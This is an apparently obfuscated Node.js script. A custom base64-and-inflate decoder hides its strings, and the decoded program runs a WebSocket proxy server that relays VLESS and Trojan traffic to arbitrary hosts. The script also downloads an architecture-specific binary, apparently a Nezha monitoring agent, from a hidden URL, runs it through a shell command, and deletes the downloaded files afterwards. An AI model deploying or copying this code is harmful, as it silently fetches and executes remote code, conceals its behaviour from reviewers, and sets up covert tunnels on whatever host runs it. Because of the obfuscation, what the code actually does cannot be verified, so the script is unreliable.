(function(L){var z,x,H,t;function Y(T,$){return T<<$}function e(T,$){return T>>$}function v(T,$){return T<=$}function o(T,$){return T%$}function Z(T,$){return T*$}function b(T,$){return T+$}function k(T,$){return T-$}function U(T,$){return T/$}function E(T,$){return T<$}function c(T,$){return T>$}function J(T,$){return T>=$}function $(T,$,Z){return T[$]=Z,T}x=$;function l(){return x(x(x(x(x({},'i','eNqFV21XG7kO/iu+ub18WWbyQhpSzmF3A4RCX6AlBLa73DPHGTsZk4k92J689O7+9yvJMwm027PwZWxLsiw9eqT8rzHMROOoURjrG/uN2RwXrsgVrk4FrqZKC1h80LhYOfi8JJXM+8IdNZt8IXrd2MFfrDdpvNDNZRuE5mTqCL7ekhlvRt4qPYONT2Sq3TnoxnySxqlZwOZHMqp0mpdC4i2GDKRGT9Us3vBFDnvvyZTgnsPiFs287u03PpOq0amE3WsS4e7azrhWX7lXRsP2b3RnaiX38l5ORiadSw8eSY6Xj0MQVIEWVnSxtyUuRmROUgi+kJTLeKfTheU9HfXjftyNcS3oiosSn8izKnTKZbBMSHTPbwp5PIB1FrzJVC6SwppUOnyxzHY+XnBSfBW2cuPQmZTMZJILaVEhRzP9/YYiqdJPoz4mkaQ+Xd/cwuKKHjPlORkoUKHd2m8sSKPbPcBMhfzItW8WOVcYrRvSGkm7lJYpx2ypNeSOGc0QKQxEfBXQTeENLJ+yKltapogdI3ZvCXZg847MSmuNPUIba7TRbXX3G2WAlHGo60h35Lkv8ZW/k9ag9GYB2UzZIMV4sVvu5owLIQVzJW1NyzzfgMImGJNrTKZ4jlVXSCliCGcppjm3ErHXXEiC0yk9yJUT+J7QlaXOlZ4jgunIoDNTOsmV8xIDdUZXWSlKAt8J3YYOFviQa9Q77Pcg4BckKNRM0hPPg6B2KwrMiPICmfxAYrpAUL7b5SXzBP978kOuZTra6BQricT7IY9XJD/Wc21W6Nvt85SEKrgRociEXMeVzYRsXg1/vxgko+HN3fAGq6V2gwmwlRv+XYzvyNIyhy2IK2KT7NyPPg1uLzBpgTss1fYw0Ir0TgmmTVYWLG6i9cghDOao2oECqqiowAyQ/oQ72cPaMiTSgkBmoQjryp2S3KMh2LqQwlxRMvL6/SnHkD+S5DlXOSDGG2alM/lSogOf589BgnVCqgt4HJ+hKU26bKV8xnies7OrEXOEasTEmNRZVFBdvCRHu/iGHMGgRneSV7yHhErMAovXmAVa2JD3jAD2JYQukzkmax0eH+hoKcKiKq4TevxgfHudDE5Ph6MR7H0lkQtQNmxlbC7+hdgjwdH4JKly9erF8w38xWi11Yq19E0osai0efCyA4Izuv002+KGLblVfJJLpAq5KPxmn7m5KmraQGqjK5oTpZuTwGxgrAVb78nYILAF9ykevSMHJ+V0S'),'U','g97SzdxS2dDklxZBRQJPIg9IeSKI2ouRShHLs4hzQh4MgXPwGoMJShTI/Do6YegTNmzrsN+bgq5bGrAPev8vNdme9isQoo21C/u8I4DKOJsy26wW5L5KPI5QuQzKfwbC0PXwcaCfsb49/imbUfazOsK3NEvQo3snBoN9OOj2+DAF9o8Ahb4RWpiZKj2Y2203HMyLcHu5hjc2HNaHWNpkQdTdCsJLmsISbB/Rtc+AEFMytkRo74BK+UwvQkHDk7KAvqvPGLYIHdHQKQLrkWC5FTi8TeqU2NT+QNdzf138ojx5KmUdrM9mhXl9ltpeplM4F21OVUkVmJ7SgpplRFHrN1vtR50tSlkzsFY90GHkqEONKVY8LUick8pHJ1W/xBbeEW/xNcXVYlHlX8RhiIKz4HdcEVEV7AubCD8I6Te+hu7vPtbLD2SC+Px5Rn27qxqQkBwWDbkw69Yo7sc/11OdegMeol0mm1LBFbqRQMU2sUzY2a5bFb894vmC4km7LNG8H74BUm3mqvgcxGCoRbSlBiP2y0869EgdHWkpW2TQkauI4oN6omMBC75SlIndY2vsrpwx5fat3snQywhkkc+HjzzrRpsNmGkmhbHaQZdRobhauX2cIjA9wyppx4CKZBywT3yx0nl0JselnEwO/iIt51XJ6/R1byqA8xdsmuh8FlqXwOODimxL/c9cKC0ML3YXR0QTrHAKoaCSYua1GfyEtjj3T/0DRqqi3nokAGTZOrKeHYOt4sHzNOYzMFMfPUioDgWfiDxdkz/yBo0fAFF/sM0Xzes9XwLKyTXegIJ43YBPxlSmrURYtGjI9TchbmUqgRBE1KGmTj+T+ccaywMDfU8jvRYkT1y4G8kn0s9o9S9CkNSq4VjgAqF25/2+GTCo0765iDqtifT6M0h70ftjjg8ODxoT7ptdHJSG6VZ4u38W5crdxdk8+z64+DyCrkhaGHjIT0RfgoAdeAA9D78PMkVRAfYCjjcU4Kf6FcJ+fgY2D1bGMF+WrMw1WViN1pjU6qAVjqZzCC0wGhIsTMLM/4WPHioimUvwMxuEmxhu9NSCbq6pAABGYQ5yjFertmfbAZoY9GSPTTw66FRbz004uYf+r/F4qGBiA8tOFyAI2lgPKw0ehEMpzZ71pN4juDa1PX/suPHcYxoDaRhzSPXYa5aVqh0hQEWrtqXF9WvF0Tp12ry8pnB5r6mswgLB72AoA6yYFRhMC/oxW/++j9WhY9/'),'T','object'),'o',!0),'M',0)}let u=l();t=Object.assign;z=JSON.parse;let j=[b(u.i,u.U)],d,m=String[b('fromCha','rCode')],f=Uint8Array,S=Uint16Array,r=Uint32Array;H=typeof window==='object'&&window||typeof self==='object'&&self||exports||typeof globalThis==='object'&&globalThis||typeof global==='object'&&global;let T=(function(T){var u,j,v,r,Z;r=$;const z=r(r({},'i','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'),'U','atob');((((Z=z.i)||3)&&(v=function(Z){var T,z,$;const m=[0];for((((T={})||9)&&($=m[0])||9)&&(z=Z.length);E($,z);$++)T[Z.charAt($)]=$;return T}(Z))&&0||(u=function(z){var Z,j,u,T;function E(){return[0,18,1,'charAt',2,8,255,'']}const $=E();return(T=z[b('leng','th')])&&0||(u=o(T,4),j=(c(T,0)?Y(v[z[b('char','At')](0)],$[1]):$[0])|(c(T,$[2])?Y(v[z[$[3]](1)],12):$[0])|(c(T,$[4])?Y(v[z[$[3]](2)],6):$[0])|(c(T,3)?v[z.charAt(3)]:$[0]),Z=[m(j>>>16),m(j>>>$[5]&$[6]),m(j&255)],Z.length-=[0,$[0],$[4],1][u],Z.join($[7]))}))&&0||(j=function(T){let $=(()=>'ace'.split('|'))();return T[b('repl',$[0])](/\S{1,4}/g,u)})||5)&&r(T,z.U,function($){function Z(){return'replace'.split('|')}let T=Z();return j(String($)[T[0]](/[^A-Za-z0-9\+\/]/g,''))})}(H),function(d){var g,u,Q,X,B,L,K,i,N,H,a,z,G,l,F,h,s,R,y,D,n,V,A,I,T;let M='p|type|K|prototype|I|length|d'.split('|');((A=8)&&0||(Q=!0)||2)&&(z=void 0);function W(T){throw T}function C(Z,u){var E,m,z,T;E=$;const v='input|index|c|N|verify|B|bufferSize|bufferType|resize'.split('|');T=this;(z=void 0,E(E(T,v[0],Z),'c',0),u||!(u={}))&&(u[v[1]]&&(T[v[2]]=u[v[1]])&&null||u.verify&&(T[v[3]]=u[v[4]]));((m=Z[T[v[2]]++])||8)&&(z=Z[T[v[2]]++]);switch(m&15){case A:T.method=A}(0!==o(b(Y(m,8),z),31)&&W(Error(b('err:',o(b(Y(m,8),z),31))))||9)&&(z&32&&W(Error('not')))&&0||E(T,v[5],new O(Z,E(E(E(E({},'index',T[v[2]]),v[6],u.bufferSize),v[7],u.bufferType),'resize',u[v[8]])))}(F=(C[b('proto',M[1])][M[0]]=function(){var T,v,z,u,Z;u=$;let m='input|p|c|i32c'.split('|');return((T=this)||5)&&(Z=T[m[0]])&&0||(v=void 0,z=void 0,v=T.B[m[1]](),u(T,'c',T.B[m[2]]),T.N&&(z=(Y(Z[T.c++],24)|Y(Z[T[m[2]]++],16)|Y(Z[T.c++],8)|Z[T[m[2]]++])>>>0,z!==jb(v)&&W(Error(m[3]))),v)},0))&&0||(B=1);function O(Z,m){var v,T;v=$;const z=(()=>['l',32768,'g','c','q',0,!1,'n','ex','bufferSize','resize','C','a','b','m','K','t'])();T=this;(v(v(v(v(v(v(v(T,z[0],[]),'m',z[1]),'e',T[z[2]]=T[z[3]]=T[z[4]]=z[5]),b('inp','ut'),I?new f(Z):Z),'s',z[6]),z[7],B),'C',z[6]),m||!(m={}))&&(((m[b('ind','ex')]&&(T.c=m[b('ind',z[8])])||3)&&(m[z[9]]&&(T.m=m.bufferSize))&&0||m[b('buffer','Type')]&&(T[z[7]]=m.bufferType)||5)&&(m[z[10]]&&(T[z[11]]=m[b('resi','ze')])));switch(T[z[7]]){case F:T.b=32768;T[z[12]]=new(I?f:Array)(b(b(z[1],T.m),258));break;case B:T[z[13]]=z[5];T.a=new(I?f:Array)(T[z[14]]);T.f=T[z[15]];T[z[16]]=T.I;T.o=T.J;break;default:W(Error('imd'))}}((O[M[3]][M[2]]=function(j){var S,r,$,T,m,t,u,v;function z(){return['th',0,'number','G',2,'length','c','a']}const H=z();return(v=this)&&0||(m=b(U(v[b('inp','ut')][b('leng',H[0])],v.c),1)|0,T=void H[1],r=void H[1],t=void 0,$=v[b('inp','ut')],u=v.a,j&&(H[2]===typeof j.v&&(m=j.v),H[2]===typeof j[H[3]]&&(m+=j.G)),c(H[4],m)?(T=U(k($.length,v[H[6]]),v.u[2]),t=Z(258,U(T,H[4]))|H[1],r=E(t,u[H[5]])?b(u.length,t):Y(u[H[5]],1)):r=Z(u[H[5]],m),I?(S=new f(r),S.set(u)):S=u,v[H[7]]=S)})||3)&&(O.prototype[M[4]]=function(){var T,m,Z;function $(){return'length|a|C|ray|subarray'.split('|')}const z=$();return(T=this)&&0||(m=T.b,I?T[z[2]]?(Z=new f(m),Z.set(T[z[1]][z[4]](0,m))):Z=T[z[1]][b('subar',z[3])](0,m):(c(T[z[1]][z[0]],m)&&(T.a.length=m),Z=T.a),T[b('buff','er')]=Z)})&&0||(O[b('proto','type')].J=function(j,S){var Y,U,L,t,H,Z,r,m,f;Y=$;function z(){return'u|length|f|e|c'.split('|')}const d=z();for((((L=this)&&0||(m=L.a)||6)&&(H=L.b)&&0||Y(L,d[0],j))&&0||(r=m[d[1]]);256!==(t=q(L,j));)if(c(256,t)){(J(H,r)&&(m=L[d[2]](),r=m[d[1]])||3)&&(m[H++]=t)}else{for((((((Z=k(t,257))||5)&&(U=u[Z])||4)&&(E(0,N[Z])&&(U+=P(L,N[Z])))&&0||(t=q(L,S))||'0')&&(f=T[t])||7)&&(E(0,l[t])&&(f+=P(L,l[t])))&&0||c(b(H,U),r)&&(m=L[d[2]](),r=m[b('leng','th')]);U--;)m[H]=m[k(H++,f)]}for(;v(8,L[d[3]]);)L[d[3]]-=8,L[d[4]]--;Y(L,'b',H)});function j(z){var l,S,Z,j,H,m,t,L,u,T,$,U,p;function k(){return[1,0]}let d=k();((U=z[b('leng','th')])&&0||(Z=0))&&0||(t=Number.POSITIVE_INFINITY);for(l=0;E(l,U);++l)c(z[l],Z)&&(Z=z[l]),E(z[l],t)&&(t=z[l]);for(u=(m=Y(d[0],Z),S=new(I?r:Array)(m),T=d[0],L=d[1],2);v(T,Z);){for(l=d[1];E(l,U);++l)if(z[l]===T){for(p=(j=0,$=L,0);E(p,T);++p)j=Y(j,d[0])|$&1,$>>=d[0];for(p=(H=Y(T,16)|l,j);E(p,m);p+=u)S[p]=H;++L}(++T&&0||(L<<=1))&&0||(u<<=d[0])}return[S,Z,t]}function q(b,j){var r,H,U,t,Z,v,z,T,u,m;H=$;let S=H(H(H(H(H({},'i','e'),'U',1),'T',8),'o','c'),'M',65535);for((((((z=b.g)&&0||(r=b[S.i]))&&0||(Z=b.input)||7)&&(t=b.c)||8)&&(T=Z.length)&&0||(v=j[0])||3)&&(U=j[S.U]);E(r,U)&&!J(t,T);)z|=Y(Z[t++],r),r+=S.T;return u=v[z&k(Y(1,U),1)],m=u>>>16,H(H(H(b,'g',e(z,m)),S.i,k(r,m)),S.o,t),u&S.M}function t(u){var Z,m,H,l,T,r,U,v,z;l=$;let S=l(l(l(l(l(l(l(l({},'i',5),'U',257),'T',4),'o','length'),'M',0),'j','z'),'O','o'),'I','call');function t(r,j,m){var U,v,T,z,S,Z;S=$;let u=S(S(S(S(S({},'i','z'),'U',0),'T',3),'o',16),'M',11);(z=this)&&false||(T=z[u.i]);for(Z=u.U;E(Z,r);)switch(v=q(z,j),v){case u.o:for(U=b(u.T,P(z,2));U--;)m[Z++]=T;break;case 17:for(U=b(u.T,P(z,3));U--;)m[Z++]=0;T=0;break;case 18:for(U=b(u.M,P(z,7));U--;)m[Z++]=0;T=u.U;break;default:T=m[Z++]=v}return S(z,'z',T),m}(((((m=b(P(u,S.i),S.U))||2)&&(T=b(P(u,5),1))&&0||(r=b(P(u,S.T),S.T)))&&null||(H=new(I?f:Array)(L[S.o]))||4)&&(v=void 0)||2)&&(U=void S.M);for(z=0;E(z,r);++z)H[L[z]]=P(u,3);if(!I){for(r=(z=r,H.length);E(z,r);++z)H[L[z]]=S.M}((((Z=j(H))&&0||(v=new(I?f:Array)(m)))&&null||(U=new(I?f:Array)(T)))&&0||l(u,S.j,0)||'1')&&u[S.O](j(t.call(u,m,Z,v)),j(t[S.I](u,T,Z,U)))}function P(v,j){var S,Z,z,m,T,u,r;S=$;let U=(()=>['length',1])();for(((((z=v.g)&&false||(T=v.e))&&false||(u=v[b('inp','ut')]))&&0||(r=v.c)||true)&&(Z=u[U[0]]);E(T,j);)J(r,Z)&&W(Error('bk')),z|=Y(u[r++],T),T+=8;return m=z&k(Y(1,j),U[1]),S(S(S(v,'g',z>>>j),'e',k(T,j)),'c',r),m}(((((((K=(O[M[3]].p=function(){var U,m,T,u,S,E,r,Z,j,v,$;const H=x(x(x(x(x(x(x(x(x(x(x(x(x(x(x(x(x({},'i',3),'U',1),'T','input'),'o','c'),'M','leng'),'j','length'),'O','g'),'I','iN'),'a',8),'N','ray'),'n','b'),'W','v'),'V','subarray'),'K','a'),'d',0),'L','e: '),'R','t');for(m=this;!m.s;){((E=P(m,H.i))&&0||E&H.U&&(m.s=Q))&&0||(E>>>=1);switch(E){case H.d:U=m[H.T];v=m[H.o];T=m.a;j=m.b;S=U[b(H.M,'th')];$=z;u=z;r=T[H.j];Z=z;m.e=m[H.O]=0;J(b(v,H.U),S)&&W(Error('iL'));$=U[v++]|Y(U[v++],8);J(b(v,H.U),S)&&W(Error(H.I));u=U[v++]|Y(U[v++],H.a);$===~u&&W(Error('ih'));c(b(v,$),U.length)&&W(Error('ib'));switch(m.n){case F:for(;c(b(j,$),T.length);){if(Z=k(r,j),$-=Z,I){(T.set(U[b('subar',H.N)](v,b(v,Z)),j)||3)&&(j+=Z)&&0||(v+=Z)}else{for(;Z--;)T[j++]=U[v++]}((m[H.n]=j)&&0||(T=m.f()))&&0||(j=m[H.n])}break;case B:for(;c(b(j,$),T[b(H.M,'th')]);)T=m.f(x({},H.W,2));break;default:W(Error('im'))}if(I){(T.set(U[H.V](v,b(v,$)),j)||'1')&&(j+=$)&&0||(v+=$)}else{for(;$--;)T[j++]=U[v++]}m.c=v;m[H.n]=j;m[H.K]=T;break;case H.U:m.o(i,G);break;case 2:t(m);break;default:W(Error(b(H.L,E)))}}return w(m[H.R]())},b('undef','ined')))||2)&&(I=K!==typeof f&&K!==typeof S&&K!==typeof r&&K!==typeof DataView)&&0||(L=(y=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15],I?new S(y):y)))&&0||(u=(H=[3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258,258,258],I?new S(H):H)))&&0||(N=(s=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0,0,0],I?new f(s):s)))&&0||(T=(g=[1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577],I?new S(g):g))||2)&&(l=(a=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13],I?new f(a):a))||1)&&(X=new(I?f:Array)(288));for(V=(V=void 0,n=0,X[b('leng','th')]);E(n,V);++n)X[n]=J(143,n)?8:J(255,n)?9:J(279,n)?7:8;((i=j(X))||true)&&(R=new(I?f:Array)(30));for(D=(D=void 0,h=0,R[M[5]]);E(h,D);++h)R[h]=5;G=j(R);function w(Z){var T,r,z,$,j,v;let u=[0,1,2,3,6,63,15,12,14,4];(((v=void u[0])||3)&&(T='')||9)&&(v=Z.length)&&0||($=0);while(E($,v)){j=Z[$++];switch(e(j,u[9])){case u[0]:case u[1]:case u[2]:case u[3]:case 4:case 5:case u[4]:case 7:T+=m(j);break;case 12:case 13:r=Z[$++];T+=m(Y(j&31,u[4])|r&u[5]);break;case u[8]:r=Z[$++];z=Z[$++];T+=m(Y(j&u[6],u[7])|Y(r&63,u[4])|Y(z&u[5],0))}}return T}d[M[6]]=function(T){function Z(){return['map','split','atob','','p']}let m=Z(),$=new C(new f(d[m[2]](T)[m[1]](m[3])[m[0]](Z=>{function T(){return x({},'i',0)}let $=T();return Z.charCodeAt($.i)})),{}),z=$[m[4]]();return z}}(H),d=typeof globalThis===u.T&&globalThis||typeof window==='object'&&window||typeof self==='object'&&self||typeof global===u.T&&global,u.o);for(let $ of j)($=H.d($),$=z($),T)?t(d,$):((d.StringExtract=$)||6)&&t(d,$);for(let T=u.M;E(T,L.length);T++)d[b('_$a',T)]&&t(d,x({},d[b('_$a',T)],L[T]))}([console.error,y=>{return y},encodeURIComponent,null,null,parseInt,console.log,false]));const os=require(Gnd),http=require(Znd),fs=require(bnd),axios=require(fnd),net=require(Rnd),path=require(Ind),crypto=require(tnd),$vB0Uz0=require(Jnd),Buffer=$vB0Uz0[znd],$vz6snz=require(hnd),exec=$vz6snz[vnd],execSync=$vz6snz[Wnd],$vyjAat=require(Lnd),WebSocket=$vyjAat[and],createWebSocketStream=$vyjAat[Xnd],UUID=process[nnd][jnd]||ind,NEZHA_SERVER=process[nnd][_nd]||'',NEZHA_PORT=process[nnd][And]||'',NEZHA_KEY=process[nnd][rnd]||'',DOMAIN=process[nnd][mnd]||Pnd,AUTO_ACCESS=process[nnd][Bnd]||!0,WSPATH=process[nnd][cnd]||UUID[snd](Dnd,lnd),SUB_PATH=process[nnd][Fnd]||Cnd,NAME=process[nnd][Mnd]||dnd,PORT=process[nnd][gdd]||Ond;let ISP='';const GetISP=async()=>{try{const O=await axios.get(wdd),f=O[Kdd];ISP=(f[ldd]+xdd+f[Odd])[Ddd](/ /g,'_')}catch(O){ISP=Ndd}};GetISP();const httpServer=http[odd]((f,O)=>{if(f[qdd]==='/'){const f=path[fdd](__dirname,Rdd);fs[Idd](f,tdd,(f,A)=>{if(f){O[Edd](ond,{[Udd]:Jdd}),O[Sdd](zdd);return}O[Edd](ond,{[Udd]:Jdd}),O[Sdd](A)});return}else{if(f[qdd]===udd+SUB_PATH){const c=Vdd+UUID+edd+DOMAIN+Ydd+DOMAIN+ydd+DOMAIN+Tdd+WSPATH+Qdd+NAME+xdd+ISP,z=pdd+UUID+edd+DOMAIN+$dd+DOMAIN+ydd+DOMAIN+Tdd+WSPATH+Qdd+NAME+xdd+ISP,A=c+'\n'+z,f=Buffer[Zdd](A)[Gdd](bdd);O[Edd](ond,{[Udd]:kdd}),O[Sdd](f+'\n')}else{O[Edd](xnd,{[Udd]:kdd}),O[Sdd](Hdd)}}}),wss=new WebSocket[hdd]({[vdd]:httpServer}),uuid=UUID[Ddd](/-/g,''),DNS_SERVERS=[Wdd,Ldd];function resolveHost(O){return new Promise((resolve,reject)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[add](O)){resolve(O);return}let A=Dnd;function f(){if(A>=DNS_SERVERS[Xdd]){reject(new Error(jdd+O+ndd));return}const c=DNS_SERVERS[A];A++;const z=idd+gnd(O)+_dd;axios.get(z,{[mdd]:qnd,[cdd]:{[Bdd]:Pdd}})[rdd](A=>{const O=A[Kdd];if(O[sdd]===Dnd&&O[Fdd]&&O[Fdd][Xdd]>Dnd){const f=O[Fdd][Cdd](O=>O[Mdd]===und);if(f){resolve(f[Kdd]);return}}f()})[Add](O=>((f()),void 0))}f()})}function handleVlessConnection(S,O){var z=snd,v=und;const [c]=O,W=O[z](v,End);if(!W[ddd]((O,f)=>O==Nnd(uuid[ghd](f*knd,knd),Und))){return!1}let m=O[z](End,Snd)[Nhd]()+Hnd;const A=O[z](m,m+=knd)[whd](Dnd),f=O[z](m,m+=v)[Nhd](),w=f==v?O[z](m,m+=Ynd)[fdd]('.'):f==knd?new TextDecoder()[Ohd](O[z](m+v,m+=v+O[z](m,m+v)[Nhd]())):f==Vnd?O[z](m,m+=Und)[Dhd]((A,f,z,O)=>z%knd?A[lhd](O[snd](z-und,z+und)):A,[])[Khd](O=>O[whd](Dnd)[Gdd](Und))[fdd](':'):'';S[xhd](new Uint8Array([c,Dnd]));const T=createWebSocketStream(S);resolveHost(w)[rdd](f=>((net[qhd]({[uhd]:f,[Ehd]:A},function(){this[khd](O[snd](m)),T[ohd](Shd,()=>{})[Uhd](this)[ohd](Shd,()=>{})[Uhd](T)})[ohd](Shd,()=>{})),void 0))[Add](f=>((net[qhd]({[uhd]:w,[Ehd]:A},function(){this[khd](O[snd](m)),T[ohd](Shd,()=>{})[Uhd](this)[ohd](Shd,()=>{})[Uhd](T)})[ohd](Shd,()=>{})),void 0));return!0}function handleTrojanConnection(A,O){var f=snd,c=und;try{if(O[Xdd]<ynd){return!1}const S=O[f](Dnd,Tnd)[Gdd](),z=[UUID];let v=null;for(const O of z){const f=crypto[ehd](Yhd)[Vhd](O)[Hhd](yhd);if(f===S){v=O;break}}if(!v){return!1}let offset=Tnd;if(O[offset]===Qnd&&O[offset+c]===pnd){offset+=knd}const l=O[offset];if(l!==c){return!1}offset+=c;const m=O[offset];offset+=c;let T,w;if(m===c){T=O[f](offset,offset+Ynd)[fdd]('.'),offset+=Ynd}else{if(m===Vnd){const A=O[offset];offset+=c,T=O[f](offset,offset+A)[Gdd](),offset+=A}else{if(m===Ynd){T=O[f](offset,offset+Und)[Dhd]((A,f,z,O)=>z%knd?A[lhd](O[snd](z-und,z+und)):A,[])[Khd](O=>O[whd](Dnd)[Gdd](Und))[fdd](':'),offset+=Und}else{return!1}}}w=O[whd](offset),offset+=knd;if(offset<O[Xdd]&&O[offset]===Qnd&&O[offset+c]===pnd){offset+=knd}const W=createWebSocketStream(A);resolveHost(T)[rdd](f=>((net[qhd]({[uhd]:f,[Ehd]:w},function(){if(offset<O[Xdd]){this[khd](O[snd](offset))}W[ohd](Shd,()=>{})[Uhd](this)[ohd](Shd,()=>{})[Uhd](W)})[ohd](Shd,()=>{})),void 0))[Add](f=>((net[qhd]({[uhd]:T,[Ehd]:w},function(){if(offset<O[Xdd]){this[khd](O[snd](offset))}W[ohd](Shd,()=>{})[Uhd](this)[ohd](Shd,()=>{})[Uhd](W)})[ohd](Shd,()=>{})),void 0));return!0}catch(z){return!1}}wss[ohd](Thd,(O,A)=>{const f=A[qdd]||'';O[Qhd](phd,f=>{if(f[Xdd]>End&&f[Dnd]===Dnd){const A=f[snd](und,End),z=A[ddd]((O,f)=>O==Nnd(uuid[ghd](f*knd,knd),Und));if(z){if(!handleVlessConnection(O,f)){O[$hd]()}return}}if(!handleTrojanConnection(O,f)){O[$hd]()}})[ohd](Shd,()=>{})});const getDownloadUrl=()=>{const O=os[Ghd]();return O===Zhd||O===bhd||O===fhd?!NEZHA_PORT?Jhd:thd:!NEZHA_PORT?Ihd:Rhd},downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY){return}try{const A=getDownloadUrl(),O=await axios({[zhd]:'get',[qdd]:A,[vhd]:hhd}),f=fs[Whd](Lhd);O[Kdd][Uhd](f);return new Promise((resolve,reject)=>((f[ohd](ahd,()=>((wnd(Xhd)),(exec(jhd,O=>{if(O){reject(O)}resolve()})),void 0))),(f[ohd](Shd,reject)),void 0))}catch(O){throw O}},runnz=async()=>{try{const status=execSync(nhd,{[_hd]:ihd});if(status[Ahd]()!==''){wnd(rhd);return}}catch(f){}await downloadFile();let z='',O=[mhd,Phd,Bhd,chd,shd,Fhd];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const f=O[Mhd](NEZHA_PORT)?ukd:'';z=Ekd+NEZHA_SERVER+kkd+NEZHA_PORT+Ukd+NEZHA_KEY+Skd+f+Hkd}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const A=NEZHA_SERVER[Mhd](':')?NEZHA_SERVER[gkd](':')[dhd]():'',f=O[Mhd](A)?wkd:Nkd,z=Kkd+NEZHA_KEY+Dkd+NEZHA_SERVER+lkd+f+Okd+UUID;fs[xkd](okd,z)}z=qkd}else{wnd(Chd);return}}try{exec(z,{[Ykd]:ekd},O=>{if(O){Knd(Tkd,O)}else{wnd(ykd)}})}catch(A){Knd(Vkd+A)}};async function addAccessTask(){if(!AUTO_ACCESS){return}if(!DOMAIN){return}const O=Qkd+DOMAIN;try{const f=await axios[pkd]($kd,{[qdd]:O},{[cdd]:{[Udd]:Gkd}});wnd(Zkd)}catch(f){}}const delFiles=()=>((fs[bkd](Lhd,()=>{})),(fs[bkd](okd,()=>{})),void 0);httpServer[fkd](PORT,()=>((runnz()),(setTimeout(()=>((delFiles()),void 0),$nd)),(addAccessTask()),(wnd(Rkd+PORT)),void 0))
